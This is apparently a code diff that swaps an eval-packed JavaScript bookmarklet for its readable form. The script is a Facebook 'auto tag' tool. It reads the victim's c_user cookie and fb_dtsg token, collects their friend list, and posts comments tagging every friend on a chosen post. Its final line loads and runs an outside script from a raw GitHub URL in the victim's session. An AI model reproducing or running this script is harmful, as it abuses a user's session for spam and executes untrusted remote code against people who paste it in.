@@ -1,1 +1,135 @@
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3K:5 14="<y><T 15=\'2d 2Y 39\'></T><a 7=\'W:1h;S:1g;10-I:1g;J-3g:3l;J-1o:2U;J-S:23;8:#m;\'>w 3o 1u Q R w K</a></y></H></H>";14+="<y><2E 3m=\'1w\' 3t=\'3v 3x o 3R 43 45\' 7=\'10-1i:1j;1H:3e;1I:3h;J-1o:3j;J-S:3k;21-8:16(19,19,19,0.1);8:#2F\'></2E></y>";14+="<y><T 15=\'2d 3z 3B\'></T><a 7=\'W:1h;J-1o:3C;S:1g;10-I:1g;J-S:23;8:3J(1A, 1A, 1A);\'>1E 3X: 42 </a></T><1K 7=\'1S-I:48\' 15=\'4a 4n 4q 4X 2H 2J\' 2P=\'1F(M);\' >37</1K><H>26 Q: <A 7=\'8:#m;\' u=\'q://s.o.l/12.13.9\' p=\'t\'>17 18 Z</A> & <A 7=\'8:#m;\' u=\'q://s.o.l/2g\' p=\'t\'> 2i w K</A>.</H>1E 1u Q: </A><A 7=\'8:#m;\' u=\'q://s.o.l/2j\' p=\'t\'> R w K</A></A>,</A><A 7=\'8:#m;\' u=\'q://s.o.l/12.13.9\' p=\'t\'> 17 18 Z</A></A>.</H>2k 2m 2n 2o 2p 2w <A 7=\'8:#m;\' u=\'q://2x.2D.l/\' p=\'t\'>R w K</A>.</A></y>";5 4o=\'26 Q: <A 7="8:#m;" u="q://s.o.l/12.13.9" p="t">17 18 Z</A> & <A 7="8:#m;" u="q://s.o.l/2g" p="t"> 2i w K</A>.</H>1E 1u Q: </A><A 7="8:#m;" u="q://s.o.l/2j" p="t"> R w K</A></A>,</A><A 7="8:#m;" u="q://s.o.l/12.13.9" p="t"> 17 18 Z</A></A>.</H>2k 2m 2n 2o 2p 2w <A 7="8:#m;" u="q://2x.2D.l/" p="t">R w K</A>.</A>\';5 1a=6.1v("y");1a.1G("7","2M-1I:2N;1H:2O;W:1J;1i:2Q;2R-2T: 1y 2W 1L 16(24, 2Z, 19, 0.31);W:1J;I:50%;1S-I:-33;11-38:I;1U-3a:1L;10:1j;z-3b:3c;1U:1j 3d 16(0,0,0,0.9);21-8:16(0,0,0,0.9);8:#2F");1a.U=14;6.P.1k(1a);27={28:v(){5 A=L;3(3s 1l!="3u")1m{A=G 1l("3y.2l")}1p(C){1m{A=G 1l("3F.2l")}1p(B){A=L}}V 3(2r.1x)1m{A=G 1x}1p(C){A=L}1c A},1z:v(b,c,d,e,f){5 g=M.2c();3(!g||!b)1c;3(g.1M)g.1M("11/2I");3(!e)e="1N";3(!d)d="11";3(!f)f={};d=d.2K();e=e.2L();5 h="1O="+(G 1P).1Q();b+=b.1R("?")+1?"&":"?";b+=h;5 i=2S;3(e=="1T"){5 j=b.2V("?");b=j[0];i=j[1]}g.1V(e,b,2X);5 k=M;3(f.1W)g.1X=v(){f.1W(g)};V g.1X=v(){3(g.30==4)3(g.1Y==32){5 a="";3(g.1Z)a=g.1Z;3(d.20(0)=="j"){a=a.34(/[\\n\\r]/g,"");a=35("("+a+")")}V 3(d.20(0)=="x")a=g.36;3(c)c(a)}V{3(f.N)6.1n("P")[0].25(f.N);3(f.F)6.O(f.F).7.1q="29";3(2a)2a(g.1Y)}};g.2b(i)},3f:v(A){5 C={"1r":"","1s":L,"3i":L,"2e":"11","2f":"1N","1t":"","F":"","N":""};2h(5 B 3n C)3(A[B])C[B]=A[B];3(!C.1r)1c;5 D=L;3(C.N){D=6.1v("y");D.1G("7","W:1h;1i:1y;I:1y;");D.1G("15","F-3p");D.U=C.N;6.1n("P")[0].1k(D);M.3q.N=D}3(C.F)6.O(C.F).7.1q="3r";M.1z(C.1r,v(E){3(C.1s)C.1s(E);3(C.1t)6.O(C.1t).U=E;3(D)6.1n("P")[0].25(D);3(C.F)6.O(C.F).7.1q="29"},C.2e,C.2f,C)},2c:v(){1c M.28()}};5 j=0;5 k=0;5 X=0;5 1b="";5 Y=G 3w;5 1d=6.1e.1f(6.1e.1f(/2q=(\\d+)/)[1]);v 1F(f){3(6.O("1w").1B!="")1b=6.O("1w").1B;27.1z(2r.3D.3E+"//s.o.l/2s/3G/3H/3I.2t?2u=1&3L[0]=3M&3N="+1d+"&3O=3P&3Q=0&2v="+1d,v(a){5 b=a;5 c=b.3S(b.1R("{"));5 d=3T.3U(c);d=d.3V.3W;2h(5 e=0;e<d.1C;e++)Y.3Y(d[e].1O);f.3Z.U="40 41...";1D()})}5 a=6.P.U;5 2y=6.44("2z")[0].1B;5 46=6.1e.1f(6.1e.1f(/2q=(\\d+)/)[1]);5 47=(G 1P).1Q();v 1D(){2A="49="+2B(1b)+"&4b=@["+Y[X]+":]&4c=2&4d=4e%4f&4g&4h&4i=4j&4k=%4l%4m%22%3A%4p%22%2C%4r%22%4s%2C%4t%22%3A%4u%22%2C%4v%22%3A%4w%22%2C%4x%22%3A"+2B(1b)+"%4y&4z=0&4A=0&4B&4C[4D]=[]&2v="+1d+"&2u=1&4E=4F&4G=4H&2z="+2y+"&4I=4J&4K=4L";4M(4N=G 1x)1V("1T","//s.o.l/2s/4O/4P.2t"),2b(2A);X++;3(X>Y.1C){4Q("w 4R 4S. 4T 4U 4V 4W.");X=0}V 2G("1D()",4Y/Y.1C)}2G("1F()",4Z);6.P.1k(6.1v(\'51\')).52="53://54.55.l/56/57/58/59.5a";',62,321,'|||if||var|document|style|color|||||||||||||com|3B5998||facebook|target|http||www|_blank|href|function|Auto||div|||||||loading|new|br|left|font|Group|false|this|loadingIndicator|getElementById|body|By|Vietnamese|size|span|innerHTML|else|position|suc|arr|Long|padding|text|bui|long|grouppost|class|rgba|Bui|Thanh|255|Popupset|msg|return|user_id|cookie|match|3px|absolute|top|5px|appendChild|ActiveXObject|try|getElementsByTagName|family|catch|display|url|onSuccess|update|Made|createElement|txtFloodMsg|XMLHttpRequest|0px|load|128|value|length|postitok|Script|autopostingfunc|setAttribute|width|height|fixed|button|10px|overrideMimeType|GET|uid|Date|getTime|indexOf|margin|POST|border|open|handler|onreadystatechange|status|responseText|charAt|background||11px||removeChild|Powered|jx|getHTTPObject|none|error|send|init|img|format|method|689255414468771|for|My|588202497939346|For|XMLHTTP|More|Tools|Visit|Our|c_user|window|ajax|php|__a|__user|Blogger|vietnameseautogroup|dts|fb_dtsg|pst|encodeURIComponent||blogspot|textarea|ffffff|setTimeout|_4jy1|xml|selected|toLowerCase|toUpperCase|min|50px|500px|onclick|100px|box|null|shadow|Tahoma|split|4px|true|sp_f52w7l|144|readyState|63|200|273px|replace|eval|responseXML|Post|align|sx_47132d|radius|index|999999|solid|493px|bind|weight|85px|onError|tahoma|13px|bold|id|in|Tag|indicator|opt|block|typeof|placeholder|undefined|Place|Array|the|Msxml2|sp_dpkef5||sx_f05251|Arial|location|protocol|Microsoft|typeahead|search|bootstrap|rgb|javascript|filter|user|viewer|token|v7|lazy|Post_ID|substring|JSON|parse|payload|entries|Privacy|push|parentNode|Please|Wait|Public|code|getElementsByName|here|composerid|now|437px|ft_ent_identifier|_42ft|comment_text|source|client_id|1389259439868|3A4121944391|reply_fbid|parent_comment_id|rootid|u_jsonp_11_4|clp|7B|22cl_impid|_4jy0|_text|22d02cb860|_11b|22clearcounter|3A0|22elementid|22js_49|22version|22x|22parent_fbid|7D|attached_sticker_fbid|attached_photo_fbid|giftoccasion|ft|tn|__dyn|7n8a9EAMHmqDzpQ9UmWOGUGy6zECQqbx2mbAKGiBAGm|__req|5o|__rev|1073774|ttstamp|265816571768812288|with|newx|ufi|add_comment|alert|tagging|Completed|Now|Refresh|your|Homepage|_4jy3|3E4|1E3||script|src|https|raw|github|buithanhlong444|Final_Tools|master|All|js'.split('|'),0,{}))
+javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Auto Tag Made By Vietnamese Auto Group</a></div></br></br>";
+grouppost += "<div><textarea id='txtFloodMsg' placeholder='Place the facebook Post_ID code here' style='padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);color:#ffffff'></textarea></div>";
+grouppost += "<div><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Public </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><br>Powered By: <A style='color:#3B5998;' href='http://www.facebook.com/bui.long.9' target='_blank'>Bui Thanh Long</A> & <A style='color:#3B5998;' href='http://www.facebook.com/689255414468771' target='_blank'> My Auto Group</A>.</br>Script Made By: </A><A style='color:#3B5998;' href='http://www.facebook.com/588202497939346' target='_blank'> Vietnamese Auto Group</A></A>,</A><A style='color:#3B5998;' href='http://www.facebook.com/bui.long.9' target='_blank'> Bui Thanh Long</A></A>.</br>For More Tools Visit Our Blogger <A style='color:#3B5998;' href='http://vietnameseautogroup.blogspot.com/' target='_blank'>Vietnamese Auto Group</A>.</A></div>";
+var _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/bui.long.9" target="_blank">Bui Thanh Long</A> & <A style="color:#3B5998;" href="http://www.facebook.com/689255414468771" target="_blank"> My Auto Group</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/588202497939346" target="_blank"> Vietnamese Auto Group</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/bui.long.9" target="_blank"> Bui Thanh Long</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank">Vietnamese Auto Group</A>.</A>';
+var Popupset = document.createElement("div");
+Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff");
+Popupset.innerHTML = grouppost;
+document.body.appendChild(Popupset);
+jx = {
+    getHTTPObject: function () {
+        var A = false;
+        if (typeof ActiveXObject != "undefined") try {
+            A = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (C) {
+            try {
+                A = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (B) {
+                A = false
+            }
+        } else if (window.XMLHttpRequest) try {
+            A = new XMLHttpRequest
+        } catch (C) {
+            A = false
+        }
+        return A
+    },
+    load: function (b, c, d, e, f) {
+        var g = this.init();
+        if (!g || !b) return;
+        if (g.overrideMimeType) g.overrideMimeType("text/xml");
+        if (!e) e = "GET";
+        if (!d) d = "text";
+        if (!f) f = {};
+        d = d.toLowerCase();
+        e = e.toUpperCase();
+        var h = "uid=" + (new Date).getTime();
+        b += b.indexOf("?") + 1 ? "&" : "?";
+        b += h;
+        var i = null;
+        if (e == "POST") {
+            var j = b.split("?");
+            b = j[0];
+            i = j[1]
+        }
+        g.open(e, b, true);
+        var k = this;
+        if (f.handler) g.onreadystatechange = function () {
+            f.handler(g)
+        };
+        else g.onreadystatechange = function () {
+            if (g.readyState == 4) if (g.status == 200) {
+                var a = "";
+                if (g.responseText) a = g.responseText;
+                if (d.charAt(0) == "j") {
+                    a = a.replace(/[\n\r]/g, "");
+                    a = eval("(" + a + ")")
+                } else if (d.charAt(0) == "x") a = g.responseXML;
+                if (c) c(a)
+            } else {
+                if (f.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(f.loadingIndicator);
+                if (f.loading) document.getElementById(f.loading).style.display = "none";
+                if (error) error(g.status)
+            }
+        };
+        g.send(i)
+    },
+    bind: function (A) {
+        var C = {
+            "url": "",
+            "onSuccess": false,
+            "onError": false,
+            "format": "text",
+            "method": "GET",
+            "update": "",
+            "loading": "",
+            "loadingIndicator": ""
+        };
+        for (var B in C) if (A[B]) C[B] = A[B];
+        if (!C.url) return;
+        var D = false;
+        if (C.loadingIndicator) {
+            D = document.createElement("div");
+            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
+            D.setAttribute("class", "loading-indicator");
+            D.innerHTML = C.loadingIndicator;
+            document.getElementsByTagName("body")[0].appendChild(D);
+            this.opt.loadingIndicator = D
+        }
+        if (C.loading) document.getElementById(C.loading).style.display = "block";
+        this.load(C.url, function (E) {
+            if (C.onSuccess) C.onSuccess(E);
+            if (C.update) document.getElementById(C.update).innerHTML = E;
+            if (D) document.getElementsByTagName("body")[0].removeChild(D);
+            if (C.loading) document.getElementById(C.loading).style.display = "none"
+        }, C.format, C.method, C)
+    },
+    init: function () {
+        return this.getHTTPObject()
+    }
+};
+var j = 0;
+var k = 0;
+var suc = 0;
+var msg = "";
+var arr = new Array;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function autopostingfunc(f) {
+    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a) {
+        var b = a;
+        var c = b.substring(b.indexOf("{"));
+        var d = JSON.parse(c);
+        d = d.payload.entries;
+        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+        f.parentNode.innerHTML = "Please Wait...";
+        postitok()
+    })
+}
+var a = document.body.innerHTML;
+var dts = document.getElementsByName("fb_dtsg")[0].value;
+var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now = (new Date).getTime();
+
+function postitok() {
+    pst = "ft_ent_identifier=" + encodeURIComponent(msg) + "&comment_text=@[" + arr[suc] + ":]&source=2&client_id=1389259439868%3A4121944391&reply_fbid&parent_comment_id&rootid=u_jsonp_11_4&clp=%7B%22cl_impid%22%3A%22d02cb860%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_49%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A" + encodeURIComponent(msg) + "%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user=" + user_id + "&__a=1&__dyn=7n8a9EAMHmqDzpQ9UmWOGUGy6zECQqbx2mbAKGiBAGm&__req=5o&fb_dtsg=" + dts + "&__rev=1073774&ttstamp=265816571768812288";
+    with(newx = new XMLHttpRequest) open("POST", "//www.facebook.com/ajax/ufi/add_comment.php"), send(pst);
+    suc++;
+    if (suc > arr.length) {
+        alert("Auto tagging Completed. Now Refresh your Homepage.");
+        suc = 0
+    } else setTimeout("postitok()", 3E4 / arr.length)
+}
+setTimeout("autopostingfunc()", 1E3);
+document.body.appendChild(document.createElement('script')).src = "https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
